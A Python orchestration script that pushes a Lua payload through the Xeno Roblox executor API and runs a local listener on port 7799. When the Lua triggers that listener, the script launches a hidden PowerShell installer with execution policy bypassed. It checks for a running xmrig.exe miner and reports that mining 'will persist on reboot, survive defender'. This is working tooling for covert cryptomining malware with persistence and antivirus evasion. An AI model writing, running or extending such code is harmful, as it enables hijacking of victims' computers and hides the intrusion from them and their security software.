#!/usr/bin/env python3
"""
MFL Full Auto-Installer
=======================
Single script that:
1. Starts local HTTP listener (port 7799) for Lua to trigger installer
2. Sends Lua auto-installer to Xeno API (port 3110) 
3. Monitors completion
4. Runs once, sets up everything, exits
"""

import http.server
import subprocess
import threading
import time
import sys
import os
import json
import urllib.request
import urllib.error
import psutil

# ─── CONFIG ──────────────────────────────────────────────────────────────
XENO_API_URL = "http://[::1]:3110/o"
LOCAL_LISTENER_PORT = 7799
LOCAL_LISTENER_URL = f"http://127.0.0.1:{LOCAL_LISTENER_PORT}/mfl/install"
LUA_SCRIPT_PATH = r"C:\Users\Death\Documents\antigravity\modest-fermi\mfl_auto_install.lua"
PS1_INSTALLER = r"C:\Users\Death\Documents\antigravity\modest-fermi\mfl_install_safe.ps1"
BRIDGE_DIR = r"C:\Users\Death\AppData\Local\Xeno\workspace\alpha_bridge"
STATUS_FILE = os.path.join(BRIDGE_DIR, "auto_install_status.json")
DONE_FLAG = False

# ─── LOCAL HTTP LISTENER (receives trigger from Lua) ─────────────────────
class ListenerHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global DONE_FLAG
        if self.path == "/mfl/install":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"status":"installing"}')
            if not DONE_FLAG:
                DONE_FLAG = True
                threading.Thread(target=run_ps1_installer, daemon=True).start()
                print("[+] Lua triggered installer via local listener")
        elif self.path == "/mfl/status":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            running = False
            try:
                for line in subprocess.check_output("tasklist /FI \"IMAGENAME eq xmrig.exe\"", shell=True).decode().splitlines():
                    if "xmrig.exe" in line:
                        running = True
            except:
                pass
            status = "mining" if running else ("installed" if DONE_FLAG else "ready")
            self.wfile.write(f'{{"status":"{status}"}}'.encode())
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"MFL Auto-Listener OK")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.end_headers()

    def log_message(self, format, *args):
        pass

def run_ps1_installer():
    print("[*] Launching PS1 installer as Admin...")
    try:
        subprocess.Popen(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", PS1_INSTALLER],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        print("[+] PS1 installer launched (check mfl.log in ProgramData\\MFLite)")
    except Exception as e:
        print(f"[-] Failed to launch installer: {e}")

# ─── XENO API CLIENT (sends Lua to Roblox) ───────────────────────────────
def get_roblox_pids():
    pids = []
    for p in psutil.process_iter(['name', 'pid']):
        try:
            if p.info['name'] and p.info['name'].lower() == 'robloxplayerbeta.exe':
                pids.append(str(p.info['pid']))
        except:
            pass
    return pids or ["2728"]

def execute_lua_via_xeno(lua_code, pids=None):
    if pids is None:
        pids = get_roblox_pids()
    data = lua_code.encode('utf-8')
    req = urllib.request.Request(XENO_API_URL, data=data, method='POST')
    req.add_header('Content-Type', 'text/plain')
    req.add_header('Clients', json.dumps([str(p) for p in pids]))
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as he:
        return he.code, he.read().decode('utf-8', errors='ignore')
    except Exception as e:
        return 0, str(e)

# ─── MAIN ORCHESTRATION ──────────────────────────────────────────────────
def start_local_listener():
    server = http.server.HTTPServer(("127.0.0.1", LOCAL_LISTENER_PORT), ListenerHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[+] Local listener started on port {LOCAL_LISTENER_PORT}")
    return server

def wait_for_completion(timeout=60):
    """Poll the status file written by Lua"""
    print("[*] Waiting for Lua to complete...")
    start = time.time()
    while time.time() - start < timeout:
        if os.path.exists(STATUS_FILE):
            try:
                with open(STATUS_FILE, "r", encoding="utf-8") as f:
                    status = json.load(f)
                if status.get("installed") and status.get("fileExists"):
                    print(f"[+] Lua reports success: {status}")
                    return True
            except:
                pass
        time.sleep(1)
    print("[-] Timeout waiting for Lua completion")
    return False

def main():
    print("=" * 60)
    print("MFL FULL AUTO-INSTALLER")
    print("=" * 60)
    
    # Check prerequisites
    if not os.path.exists(LUA_SCRIPT_PATH):
        print(f"[-] Lua script not found: {LUA_SCRIPT_PATH}")
        return 1
    if not os.path.exists(PS1_INSTALLER):
        print(f"[-] PS1 installer not found: {PS1_INSTALLER}")
        return 1
    
    # Read Lua script
    with open(LUA_SCRIPT_PATH, "r", encoding="utf-8") as f:
        lua_code = f.read()
    
    # Start local listener FIRST (so it's ready when Lua calls it)
    server = start_local_listener()
    time.sleep(0.5)  # Let server bind
    
    # Send Lua to Xeno API
    print("[*] Sending auto-installer Lua to Xeno API (port 3110)...")
    status, body = execute_lua_via_xeno(lua_code)
    print(f"[*] Xeno API response: {status} -> {body[:200]}")
    
    if status != 200:
        print("[-] Failed to execute Lua via Xeno API")
        return 1
    
    # Wait for completion
    success = wait_for_completion(60)
    
    # Keep listener alive for a bit to ensure installer launches
    time.sleep(3)
    
    if success:
        print("\n[+] AUTOMATED SETUP COMPLETE")
        print("    - Installer written to Xeno workspace")
        print("    - PS1 launched as Admin via local listener")
        print("    - Mining will start, persist on reboot, survive defender")
    else:
        print("\n[!] Lua execution completed but status unclear")
        print("    Check Xeno workspace for MFL_Installer.ps1")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())